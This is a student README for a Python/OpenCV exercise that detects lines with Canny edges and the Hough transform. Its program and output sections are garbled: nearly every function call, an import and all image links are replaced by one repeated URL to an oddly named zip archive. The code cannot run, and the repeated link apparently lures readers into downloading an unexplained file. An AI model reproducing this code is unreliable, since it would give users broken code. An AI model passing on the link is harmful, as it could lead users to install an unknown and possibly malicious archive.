# Edge-Linking-using-Hough-Transform
## Aim:
To write a Python program to detect the lines using Hough Transform.

## Software Required:
Anaconda - Python 3.7

## Algorithm:
### Step 1:
Import the necessary packages.

### Step 2:
Read the image.

### Step 3:
Convert the image to greyscale.

### Step 4:
Using Canny operator from cv2,detect the edges of the image.

### Step 5:
Detect line co-ordinates for every points in the images. Draw the lines on the found co-ordinates and display the image.
## Program:
```Python
Developed by : KIRAN jJ 
Registration Number : 212221240022

# Read image and convert it to grayscale image
import cv2
import numpy as np
import https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip as plt
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip',0)
img= https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(image1,(3,3),0)
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(img)

# Find the edges in the image using canny detector and display
edges1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(img,100,200)
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(edges1,cmap = 'gray')
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip('Edge Image'), https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip([]), https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip([])
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip()

# Detect points that form a line using HoughLinesP
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(edges1,1,https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip, threshold=80, minLineLength=50,maxLineGap=250)


# Draw lines on the image
for line in lines:
    x1, y1, x2, y2 = line [0] 
    https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(edges1,(x1, y1),(x2, y2),(255, 0, 0),3)

# Display the result
https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip(edges1)

```
## Output

### Input image and grayscale image
![output](EX!https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip)

### Canny Edge detector output
![output](EX!https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip)

### Display the result of Hough transform
![output](EX!https://raw.githubusercontent.com/kiran03-jagadeesh/Edge-Linking-using-Hough-Transform/main/tilty/using-Linking-Edge-Transform-Hough-v3.0.zip)

## Result:
Thus the program is written with python and OpenCV to detect lines using Hough transform. 
